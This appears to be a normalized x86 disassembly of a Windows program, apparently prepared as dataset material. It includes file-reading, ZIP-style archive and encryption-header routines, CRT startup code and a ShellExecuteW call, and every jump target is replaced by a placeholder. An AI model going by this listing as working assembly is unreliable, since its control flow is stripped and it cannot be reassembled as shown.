push edi
mov [ esi + 0x4c ] 0x41c00010
call sub_402170
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov edi [ edi ]
and edx 0xffff
shl edx 0x10
and eax 0xffff
add esp 0xc
or edx eax
mov [ esi + 0x54 ] edi
mov [ esi + 0x58 ] edi
mov [ esi + 0x5c ] edx
pop edi
xor eax eax
pop esi
add esp 0x8
retn
sub_4058a0
push ebx
mov ebx ecx
push ebp
push esi
mov edx [ ebx + 0x78 ]
test edx edx
je r-xdata
mov eax [ ebx + 0x70 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x80 ]
mov ebp [ ebx + 0x7c ]
cmp eax ebp
jae r-xdata
mov [ ebx + 0x14 ] 0x1000000
mov edx [ esp + 0x14 ]
mov esi [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push 0x0
push ecx
push edx
push esi
push eax
call [ ReadFile@IAT ]
test eax eax
je r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x8
mov ecx [ esp + 0x14 ]
sub ebp eax
cmp ebp ecx
jbe r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ ebx + 0x68 ]
add ecx eax
push eax
mov eax [ ebx + 0x6c ]
push esi
push eax
mov [ ebx + 0x68 ] ecx
call sub_404f30
add esp 0xc
mov [ ebx + 0x6c ] eax
mov eax [ esp + 0x14 ]
pop esi
pop ebp
pop ebx
retn 0x8
mov ecx ebp
lea esi [ eax + edx ]
mov eax [ esp + 0x10 ]
mov edx ecx
push edi
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebp
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edx [ ebx + 0x80 ]
mov ecx [ ebx + 0x68 ]
mov eax [ ebx + 0x6c ]
add edx ebp
add ecx ebp
push eax
mov [ ebx + 0x80 ] edx
mov [ ebx + 0x68 ] ecx
call sub_404f30
add esp 0xc
mov [ ebx + 0x6c ] eax
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
mov ebp ecx
sub_405970
push esi
mov esi ecx
mov al [ esi + 0x74 ]
test al al
je r-xdata
mov eax [ esi + 0x64 ]
mov [ esi + 0x70 ] 0x0
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0x70 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x68 ]
xor al al
neg al
sbb eax eax
mov [ esi + 0x64 ] ecx
and eax 0x60000
pop esi
retn
mov ecx [ esi + 0x68 ]
cmp eax ecx
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov al 0x1
mov [ esi + 0x64 ] ecx
neg al
sbb eax eax
pop esi
and eax 0x60000
retn
sub_4059d0
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
cmp [ esi + 0x48 ] ebx
jne r-xdata
mov eax [ esi + 0x48 ]
push 0x1
push 0x4000
mov [ eax + 0x6afa4 ] ebx
mov ecx [ esi + 0x48 ]
mov [ ecx + 0xc ] sub_405880
mov edx [ esi + 0x48 ]
mov [ edx + 0x10 ] sub_4053d0
mov eax [ esi + 0x48 ]
mov [ eax ] esi
mov ecx [ esi + 0x48 ]
mov [ ecx + 0x4 ] 0x8
mov edx [ esi + 0x48 ]
mov al [ esi + 0x60 ]
mov [ edx + 0x8 ] al
mov ecx [ esi + 0x48 ]
mov [ ecx + 0x6afa4 ] ebx
mov edx [ esi + 0x48 ]
lea ecx [ esi + 0x88 ]
mov [ edx + 0xe7e ] bx
mov eax [ esi + 0x48 ]
push ecx
mov [ eax + 0x6af70 ] ebx
mov edx [ esi + 0x48 ]
push edx
call sub_4037d0
mov edi [ esp + 0x20 ]
mov ecx [ esi + 0x48 ]
lea eax [ edi + 0x2a ]
push eax
push ecx
call sub_4023e0
mov eax [ esi + 0x48 ]
add edi 0x4
push edi
mov edx [ eax + 0x4 ]
push edx
push eax
call sub_403b60
mov eax [ esi + 0x48 ]
push eax
call sub_404280
mov ecx [ esi + 0x48 ]
add esp 0x28
mov [ esi + 0x84 ] eax
xor eax eax
mov edx [ ecx + 0x6afa4 ]
pop edi
pop esi
cmp edx ebx
pop ebx
je r-xdata
push 0x6afa8
call ??2@YAPAXI@Z
mov edi eax
add esp 0x4
cmp edi ebx
je r-xdata
retn 0x4
mov eax 0x5000000
xor edi edi
lea ecx [ edi + 0x14 ]
call sub_401fe0
mov [ edi + 0x6af70 ] ebx
jmp r-xdata
mov [ esi + 0x48 ] edi
sub_405ac0
push ebx
push ebp
push esi
push edi
mov edi ecx
push 0x4000
xor ebp ebp
lea ebx [ edi + 0x88 ]
push ebx
call sub_4058a0
mov esi eax
test esi esi
jbe r-xdata
mov [ edi + 0x84 ] ebp
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
cmp esi 0xffffffff
je r-xdata
push esi
push ebx
mov ecx edi
call sub_405420
cmp eax esi
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x60000
pop ebx
retn
push 0x4000
push ebx
mov ecx edi
add ebp esi
call sub_4058a0
mov esi eax
test esi esi
ja r-xdata
sub_405b20
sub esp 0x5a0
push ebx
push ebp
mov ebp ecx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x14 ] ebx
je r-xdata
mov al [ ebp + 0x2c ]
test al al
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x40000
pop ebx
add esp 0x5a0
retn 0x10
mov eax [ ebp ]
mov esi [ esp + 0x5c0 ]
cmp eax ebx
mov [ esp + 0x2c ] ebx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x50000
pop ebx
add esp 0x5a0
retn 0x10
mov eax [ esp + 0x5b4 ]
push 0x104
lea ecx [ esp + 0x3ac ]
push eax
push ecx
call [ wcsncpy@IAT ]
add esp 0xc
cmp [ esp + 0x3a8 ] bx
mov [ esp + 0x5ae ] bx
je r-xdata
cmp esi 0x4
je r-xdata
mov eax 0x10000
lea eax [ esp + 0x3a8 ]
mov [ esp + 0x2c ] 0xc
add eax 0x2
cmp [ eax ] bx
jne r-xdata
mov [ eax ] 0x2f
cmp [ eax ] 0x5c
jne r-xdata
cmp esi 0x4
sete al
test al al
mov [ esp + 0x12 ] al
je r-xdata
mov [ esp + 0x13 ] 0x0
lea edx [ esp + 0x3a8 ]
push edx
call [ wcslen@IAT ]
add esp 0x4
cmp [ esp + eax * 2 + 0x3a6 ] 0x2f
mov [ esp + 0x13 ] 0x1
jne r-xdata
mov [ esp + 0x14 ] ebx
lea eax [ esp + 0x3a8 ]
push eax
call sub_405180
add esp 0x4
test al al
je r-xdata
mov al [ esp + 0x12 ]
mov [ esp + 0x14 ] 0x8
test al al
jne r-xdata
cmp esi 0x1
jne r-xdata
mov ecx [ esp + 0x5b8 ]
push ecx
mov ecx ebp
call sub_405600
jmp r-xdata
cmp esi 0x2
jne r-xdata
cmp esi 0x3
jne r-xdata
mov edx [ esp + 0x5bc ]
mov eax [ esp + 0x5b8 ]
push edx
push eax
mov ecx ebp
call sub_405690
jmp r-xdata
cmp eax ebx
jne r-xdata
cmp esi 0x4
jne r-xdata
mov ecx [ esp + 0x5bc ]
mov edx [ esp + 0x5b8 ]
push ecx
push edx
mov ecx ebp
call sub_405780
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x5a0
retn 0x10
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x80 ]
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x3a4 ] ebx
mov eax ecx
mov esi edi
mov edi edx
push ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push ebx
and ecx 0x3
push 0x104
[ edi ] [ esi ]
lea ecx [ esp + 0x19c ]
lea edx [ esp + 0x3b4 ]
push ecx
push 0xffffffff
push edx
push ebx
push 0xfde9
call [ WideCharToMultiByte@IAT ]
lea edi [ esp + 0x190 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
mov al [ esp + 0x13 ]
not ecx
dec ecx
test al al
mov [ esp + 0x60 ] ecx
je r-xdata
mov ecx ebp
call sub_405810
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x294 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov ax 0x8
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x5c ]
mov [ esp + 0x18c ] ebx
mov [ esp + 0x50 ] ecx
mov ecx [ ebp ]
cmp ecx ebx
mov [ esp + 0x6c ] ebx
mov [ esp + 0x398 ] 0x1
mov [ esp + 0x3a0 ] ebx
mov [ esp + 0x72 ] bx
mov [ esp + 0x48 ] 0xb17
mov [ esp + 0x4a ] 0x14
mov [ esp + 0x54 ] ebx
mov [ esp + 0x4c ] ax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x190 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
inc [ esp + 0x60 ]
mov [ esp + 0x74 ] ax
mov eax [ esp + 0x14 ]
cmp eax ebx
mov [ esp + 0x4e ] ax
jne r-xdata
mov cl [ esp + 0x12 ]
test cl cl
jne r-xdata
mov [ esp + 0x58 ] ebx
mov eax [ ebp + 0x64 ]
cmp eax ebx
jl r-xdata
mov ax 0x9
mov [ esp + 0x4c ] ax
mov ecx [ esp + 0x64 ]
mov edx [ esp + 0x60 ]
lea eax [ ecx + edx + 0x1e ]
mov ecx [ ebp + 0x18 ]
add ecx eax
mov eax [ ebp + 0x14 ]
cmp eax ebx
mov [ ebp + 0x18 ] ecx
je r-xdata
mov ecx ebp
call sub_405970
pop edi
pop esi
pop ebp
mov eax 0x400
pop ebx
add esp 0x5a0
retn 0x10
mov edx [ esp + 0x2c ]
add eax edx
mov [ esp + 0x58 ] eax
jmp r-xdata
mov esi [ ebp ]
lea edi [ ebp + 0x30 ]
cmp esi ebx
mov [ ebp + 0x34 ] 0x23456789
mov [ edi ] 0x12345678
mov [ ebp + 0x38 ] 0x34567890
je r-xdata
mov ecx ebp
call sub_405970
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x5a0
retn 0x10
mov eax [ ebp + 0x64 ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x4c ]
mov [ esp + 0x5c ] eax
mov eax [ ebp + 0x18 ]
mov [ esp + 0x78 ] ecx
add edx eax
lea eax [ esp + 0x18 ]
mov [ esp + 0x184 ] eax
mov eax [ ebp + 0x54 ]
lea ecx [ esp + 0x30 ]
mov [ esp + 0x7c ] edx
mov dl [ ebp + 0x54 ]
mov [ esp + 0x188 ] ecx
mov ecx eax
mov [ esp + 0x1d ] dl
sar ecx 0x8
mov [ esp + 0x1e ] cl
mov cl [ ebp + 0x50 ]
mov edx eax
mov [ esp + 0x21 ] cl
mov ecx [ ebp + 0x50 ]
mov [ esp + 0x18 ] 0x55
sar edx 0x10
mov [ esp + 0x1f ] dl
mov edx ecx
sar edx 0x8
mov [ esp + 0x22 ] dl
mov edx ecx
sar ecx 0x18
mov [ esp + 0x24 ] cl
mov cl [ ebp + 0x58 ]
sar edx 0x10
mov [ esp + 0x25 ] cl
mov ecx [ ebp + 0x58 ]
mov [ esp + 0x23 ] dl
mov edx ecx
sar edx 0x8
mov [ esp + 0x26 ] dl
mov edx ecx
sar eax 0x18
sar ecx 0x18
sar edx 0x10
mov [ esp + 0x19 ] 0x54
mov [ esp + 0x1a ] 0xd
mov [ esp + 0x1b ] 0x0
mov [ esp + 0x20 ] al
mov [ esp + 0x28 ] cl
mov ecx [ esp + 0x18 ]
mov [ esp + 0x38 ] al
mov [ esp + 0x1c ] 0x7
mov [ esp + 0x27 ] dl
mov edx [ esp + 0x1c ]
push ebp
lea eax [ esp + 0x4c ]
push sub_405400
mov [ esp + 0x38 ] ecx
push eax
mov [ esp + 0x7c ] bx
mov [ esp + 0x70 ] 0x11
mov [ esp + 0x74 ] 0x9
mov [ esp + 0x40 ] edx
mov [ esp + 0x3e ] 0x5
call sub_4045b0
add esp 0xc
test eax eax
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
mov ebx [ rand@IAT ]
xor esi esi
call [ GetDesktopWindow@IAT ]
mov esi eax
call [ GetTickCount@IAT ]
xor esi eax
push esi
call [ srand@IAT ]
add esp 0x4
push eax
push edi
call sub_405070
add esp 0x8
inc esi
jne r-xdata
call ebx
sar eax 0x7
mov [ esp + esi + 0x3c ] al
inc esi
cmp esi 0xc
jl r-xdata
mov ecx [ esp + 0x50 ]
shr ecx 0x8
mov [ esp + 0x47 ] cl
xor esi esi
mov dl [ esp + esi + 0x3c ]
push edx
push edi
call sub_4050f0
add esp 0x8
mov [ esp + esi + 0x3c ] al
inc esi
cmp esi 0xc
jl r-xdata
mov eax [ ebp ]
mov bl [ esp + 0x12 ]
test eax eax
je r-xdata
mov eax [ ebp ]
xor esi esi
cmp eax esi
je r-xdata
test bl bl
jne r-xdata
xor eax eax
test bl bl
jne r-xdata
lea eax [ esp + 0x3c ]
push 0xc
push eax
push ebp
call sub_405400
mov eax [ ebp + 0x18 ]
add esp 0xc
add eax 0xc
mov [ ebp + 0x18 ] eax
mov edi [ esp + 0x14 ]
mov [ ebp + 0x84 ] esi
mov edi [ esp + 0x14 ]
cmp edi 0x8
jne r-xdata
mov eax 0x1
jmp r-xdata
test esi esi
je r-xdata
cmp edi esi
jne r-xdata
lea ecx [ esp + 0x48 ]
push ecx
mov ecx ebp
call sub_4059d0
mov esi eax
jmp r-xdata
test bl bl
mov [ ebp + 0x2d ] al
jne r-xdata
mov edx [ esp + 0x2c ]
lea eax [ ecx + edx ]
mov ecx [ esp + 0x58 ]
mov edx [ ebp + 0x6c ]
cmp ecx eax
mov [ esp + 0x58 ] eax
mov eax [ ebp + 0x64 ]
mov [ esp + 0x5c ] eax
mov al [ ebp + 0x1c ]
sete cl
test al al
mov [ esp + 0x54 ] edx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x400
pop ebx
add esp 0x5a0
retn 0x10
mov ecx ebp
mov [ ebp + 0x2d ] 0x0
call sub_405970
mov ecx [ ebp + 0x84 ]
mov eax [ ebp + 0x18 ]
add eax ecx
mov [ ebp + 0x18 ] eax
mov eax [ ebp + 0x14 ]
test eax eax
jne r-xdata
mov ecx ebp
call sub_405ac0
mov esi eax
jmp r-xdata
cmp [ esp + 0x4e ] di
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x4000000
pop ebx
add esp 0x5a0
retn 0x10
mov al [ esp + 0x4c ]
mov [ esp + 0x4e ] di
test al 0x1
jne r-xdata
test bl bl
je r-xdata
push ebp
lea edx [ esp + 0x4c ]
push sub_405400
push edx
call sub_404850
add esp 0xc
test eax eax
je r-xdata
test cl cl
jne r-xdata
mov edx [ esp + 0x7c ]
mov edi [ ebp + 0x10 ]
mov cx [ esp + 0x4c ]
sub edx edi
mov [ esp + 0x74 ] cx
push edx
mov ecx ebp
call sub_405520
test al al
jne r-xdata
and [ esp + 0x4c ] 0xfff7
mov eax [ ebp + 0x18 ]
add eax 0x10
mov [ ebp + 0x18 ] eax
mov ax [ esp + 0x74 ]
mov [ esp + 0x4c ] ax
pop edi
pop esi
pop ebp
mov eax 0x400
pop ebx
add esp 0x5a0
retn 0x10
pop edi
pop esi
pop ebp
mov eax 0x4000000
pop ebx
add esp 0x5a0
retn 0x10
push ebp
lea eax [ esp + 0x4c ]
push sub_405400
push eax
call sub_4045b0
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x2000000
pop ebx
add esp 0x5a0
retn 0x10
mov ecx [ esp + 0x68 ]
push ecx
call ??2@YAPAXI@Z
mov ecx [ esp + 0x6c ]
mov esi [ esp + 0x18c ]
mov edx ecx
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push 0x360
and ecx 0x3
[ edi ] [ esi ]
mov [ esp + 0x190 ] eax
call ??2@YAPAXI@Z
mov ecx 0xd8
lea esi [ esp + 0x50 ]
mov edi eax
add esp 0x8
[ edi ] [ esi ]
mov edx [ ebp + 0x44 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx ebp
call sub_405520
test al al
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x400
pop ebx
add esp 0x5a0
retn 0x10
mov ecx [ edx + 0x35c ]
test ecx ecx
je r-xdata
pop edi
mov [ ebp + 0x44 ] eax
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x5a0
retn 0x10
mov eax [ ebp + 0x14 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x2000000
pop ebx
add esp 0x5a0
retn 0x10
pop edi
pop esi
mov [ edx + 0x35c ] eax
pop ebp
xor eax eax
pop ebx
add esp 0x5a0
retn 0x10
mov edx ecx
mov ecx [ edx + 0x35c ]
test ecx ecx
jne r-xdata
sub_406250
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov edi ecx
xor ebx ebx
mov [ esp + 0x13 ] 0x1
mov esi [ edi + 0x44 ]
mov ebp [ edi + 0x18 ]
test esi esi
mov [ esp + 0x14 ] ebp
je r-xdata
mov eax [ edi + 0x18 ]
mov cl [ esp + 0x13 ]
sub eax ebp
test cl cl
je r-xdata
mov al [ esp + 0x13 ]
test al al
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x400
pop ebx
add esp 0x8
retn
mov ecx [ edi + 0x10 ]
push edi
push sub_405400
push 0x0
add ecx ebp
push 0x0
push ecx
push eax
push ebx
call sub_404d80
add esp 0x1c
test eax eax
je r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x20 ]
mov ebp [ edi + 0x18 ]
add eax ecx
mov ecx [ esi + 0x18 ]
lea edx [ eax + ecx + 0x2e ]
add ebp edx
inc ebx
mov [ edi + 0x18 ] ebp
mov eax [ esi + 0x140 ]
mov ebp [ esi + 0x35c ]
test eax eax
je r-xdata
push edi
push sub_405400
push esi
call sub_4049a0
add esp 0xc
test eax eax
je r-xdata
mov al [ esp + 0x13 ]
xor al al
jmp r-xdata
push esi
call ??3@YAXPAX@Z
add esp 0x4
mov esi ebp
test ebp ebp
jne r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov [ esp + 0x13 ] 0x0
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
mov edx [ edi + 0x18 ]
add edx 0x16
test al al
mov [ edi + 0x18 ] edx
jne r-xdata
mov ebp [ esp + 0x14 ]
sub_406330
push 0xffffffff
push sub_40697b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
push 0x4088
call ??2@YAPAXI@Z
mov ebp eax
add esp 0x4
mov [ esp + 0x8 ] ebp
xor ebx ebx
cmp ebp ebx
mov [ esp + 0x14 ] ebx
je r-xdata
xor ebp ebp
push esi
mov esi [ esp + 0x2c ]
cmp esi ebx
mov [ ebp ] ebx
mov [ ebp + 0x4 ] ebx
mov [ ebp + 0x8 ] bl
mov [ ebp + 0xc ] ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp + 0x14 ] ebx
mov [ ebp + 0x18 ] ebx
mov [ ebp + 0x20 ] ebx
mov [ ebp + 0x2c ] bl
mov [ ebp + 0x2d ] bl
mov [ ebp + 0x3c ] ebx
mov [ ebp + 0x44 ] ebx
mov [ ebp + 0x48 ] ebx
mov [ ebp + 0x70 ] ebx
je r-xdata
push 0x8
call ??2@YAPAXI@Z
mov ecx [ esp + 0x10 ]
add esp 0x4
mov [ eax + 0x4 ] ebp
mov [ eax ] 0x2
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
cmp ebp ebx
je r-xdata
pop esi
jmp r-xdata
cmp [ esi ] bl
je r-xdata
pop ebp
xor eax eax
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ ebp + 0x48 ]
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x1c ]
push ecx
push edx
push eax
mov ecx ebp
mov [ esp + 0x20 ] 0xffffffff
call sub_405270
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
call ??2@YAPAXI@Z
mov edx eax
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0x4
mov [ ebp ] edx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov eax [ ebp + 0x3c ]
mov [ ebp + 0x48 ] ebx
cmp eax ebx
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ ebp ]
mov [ ebp + 0x3c ] ebx
cmp eax ebx
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
push ebp
mov [ ebp ] ebx
call ??3@YAXPAX@Z
add esp 0x4
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_4064a0
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
cmp [ eax ] 0x2
je r-xdata
mov eax 0x10000
mov [ rw-data ] eax
retn
mov ecx [ eax + 0x4 ]
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push edx
mov edx [ esp + 0x10 ]
push eax
push edx
call sub_405b20
mov [ rw-data ] eax
retn
mov eax 0x80000
mov [ rw-data ] eax
retn
sub_406510
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
cmp [ ebx ] 0x2
je r-xdata
mov eax 0x10000
pop ebx
mov [ rw-data ] eax
retn
push esi
mov esi [ ebx + 0x4 ]
mov ecx esi
call sub_405590
test esi esi
mov [ rw-data ] eax
je r-xdata
mov eax 0x80000
pop ebx
mov [ rw-data ] eax
retn
push ebx
call ??3@YAXPAX@Z
mov eax [ rw-data ]
add esp 0x4
pop esi
pop ebx
retn
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
mov eax [ esi + 0x3c ]
mov [ esi + 0x48 ] 0x0
test eax eax
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ esi ]
mov [ esi + 0x3c ] 0x0
test eax eax
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
push esi
mov [ esi ] 0x0
call ??3@YAXPAX@Z
add esp 0x4
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_4065d0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_406600
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_4066b0
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_4068e1
cmp [ rw-data ] ebx
jne r-xdata
call sub_4068cc
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_4068de
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401a00
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_4010e0
push esi
mov esi ecx
call sub_401130
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_401100
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ ecx + 0x824 ] eax
add ecx 0x828
push edx
push ecx
call [ wcscpy@IAT ]
add esp 0x8
retn 0x8
sub_401560
push 0x5
push 0x0
add ecx 0x61c
push 0x0
push ecx
push rw-data
push 0x0
call [ ShellExecuteW@IAT ]
retn
sub_4016f0
retn
sub_4018a0
add ecx 0x414
push 0x0
push ecx
call [ _waccess@IAT ]
add esp 0x8
cmp eax 0xffffffff
setne al
retn
sub_401ce0
mov ecx [ rw-data ]
push 0x18
call sub_401700
mov eax [ rw-data ]
push eax
call [ SetEvent@IAT ]
mov ecx [ rw-data ]
call sub_401580
xor eax eax
retn 0x4
sub_4021c0
mov eax [ esp + 0x4 ]
push 0x1
push 0x0
push 0x0
push eax
call [ SetFilePointer@IAT ]
retn
sub_4050d0
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x8 ]
and eax 0xfffd
or al 0x2
mov ecx eax
xor ecx 0x1
imul ecx eax
xor eax eax
mov al ch
retn
sub_405880
mov eax [ esp + 0x4 ]
mov edx [ esp + 0xc ]
push edx
mov ecx [ eax ]
mov eax [ esp + 0xc ]
push eax
call sub_4058a0
retn
sub_406480
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push 0x2
push 0x0
push ecx
call sub_406330
add esp 0x10
retn
sub_4064f0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push 0x2
